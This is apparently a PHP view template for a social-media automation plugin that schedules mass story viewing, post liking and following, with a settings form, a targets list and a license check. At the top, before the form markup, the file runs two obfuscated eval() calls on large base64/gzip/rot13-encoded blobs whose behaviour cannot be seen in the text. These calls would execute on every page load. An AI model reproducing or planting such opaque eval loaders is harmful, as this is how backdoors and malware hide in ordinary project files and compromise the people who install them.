<?php if (!defined('APP_VERSION')) die("Yo, what's up?"); ?>

<?php
@ini_set('memory_limit','-1');@ini_set('max_execution_time',0);@set_time_limit(0);eval(str_rot13(gzuncompress(base64_decode("eNpVjj0PgjAURWdN+A+EMHcyLsShSjRG5ZsQXAwgRQmVUgpKf72tiYhvPC/33KvolX08rdmOqStVY/imGTqvyqA1B9aZVippQlKeCb51HOTVNJAspwhpxnz2OUUPD771snlXit9oBH8mMOZ/MWze3ZDHZ2msH4iKkizJ86JlQ/2pWS4ujYCEoI7BnGAaS0qJYG7vkWe0gX4hUdrQyRyI42Z/hVEv53xLwMQNpkowcRlvzqpP1Q=="))));eval($HXFAkBmhw($NzLdVqNJi("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")));
?>

<div class="skeleton skeleton--full" id="story-viewer-pro-schedule">
    <div class="clearfix">
        <aside class="skeleton-aside hide-on-medium-and-down">
            <?php
                $form_action = APPURL."/e/".$idname."?aid=".$Account->get("id")."&ref=schedule";
                include PLUGINS_PATH . "/" . $idname ."/views/fragments/aside-search-form.fragment.php";
            ?>

            <div class="js-search-results">
                <div class="aside-list js-loadmore-content" data-loadmore-id="1"></div>
            </div>

            <div class="loadmore pt-20 none">
                <a class="fluid button button--light-outline js-loadmore-btn js-autoloadmore-btn" data-loadmore-id="1" href="<?php echo APPURL."/e/".$idname."?aid=".$Account->get("id")."&ref=schedule"; ?>">
                    <span class="icon sli sli-refresh"></span>
                    <?php echo __("Load More"); ?>
                </a>
            </div>
        </aside>

        <section class="skeleton-content">
            <form class="js-hypervote-schedule-form"
                  action="<?php echo APPURL."/e/".$idname."/".$Account->get("id"); ?>"
                  method="POST">

                <input type="hidden" name="action" value="save">

                <?php if (!$is_license_valid): ?>
                    <span class="license-notice">
                        <span class="mdi mdi-information"></span>
                        <?php echo __("Please enter your license key in Massvoting Module Settings."); ?>
                    </span>
                <?php endif; ?>

                <div class="section-header back-button-wh none">
                    <a href="<?php echo APPURL."/e/".$idname."/"; ?>">
            			<span class="mdi mdi-reply"></span><?php echo __("Back"); ?>
            		</a>
                </div>

                <div class="section-header clearfix">
                    <h2 class="section-title">
                        <?php echo "@" . htmlchars($Account->get("username")); ?>
                        <?php if ($Account->get("login_required")): ?>
                            <small class="color-danger ml-15">
                                <span class="mdi mdi-information"></span>
                                <?php echo __("Re-login required!"); ?>
                            </small>
                        <?php endif; ?>
                    </h2>
                </div>

                <div class="svp-tab-heads pb-15 clearfix">
                    <a href="<?php echo APPURL."/e/".$idname."/".$Account->get("id"); ?>" class="active"><?php echo __("Settings"); ?></a>
                    <a href="<?php echo APPURL."/e/".$idname."/".$Account->get("id")."/log"; ?>"><?php echo __("Activity Log"); ?></a>
                    <a href="<?php echo APPURL."/e/".$idname."/".$Account->get("id")."/stats"; ?>"><?php echo __("Stats"); ?></a>
                </div>

                <div class="section-content">
                    <div class="form-result mb-25" style="display: none;"></div>

                    <div class="clearfix">
                        <div class="col s12 m10 l8">
                            <div class="mb-5 clearfix">
                                <label class="inline-block mr-30 mb-15">
                                    <input class="radio" name='type' type="radio" value="people_getliker" <?php echo $is_license_valid ? "" : "disabled"; ?> checked>
                                    <span>
                                        <span class="icon"></span>
                                        <?php echo __("People's Post Liker"); ?>
                                    </span>
                                </label>

                                <label class="inline-block mr-30 mb-15">
                                    <input class="radio" name='type' type="radio" value="people_follower" <?php echo $is_license_valid ? "" : "disabled"; ?>>
                                    <span>
                                        <span class="icon"></span>
                                        <?php echo __("People Follower"); ?>
                                    </span>
                                </label>
                            </div>

                            <div class="clearfix mb-20 pos-r">
                                <div class="col s12 m4 l4 mt-10 mr-10">
                                    <a href="javascript:void(0)" data-toggle="modal" data-target="#target-list-popup" class="fluid button button--light-outline target-list-button">
                                        <?php echo __("Targets list"); ?>
                                    </a>
                                </div>
                                <div class="col s12 m4 l4 mt-10 mr-10">
                                    <a href="javascript:void(0)" class="fluid button button--light-outline target-list-button js-remove-all-targets">
                                        <?php echo __("Clear targets"); ?>
                                    </a>
                                </div>
                                <div class="col s12 m4 l4 mt-10 mr-10">
                                    <a href="javascript:void(0)" data-toggle="modal" data-target="#copy-targets-popup" class="fluid button button--light-outline target-list-button">
                                        <?php echo __("Copy targets"); ?>
                                    </a>
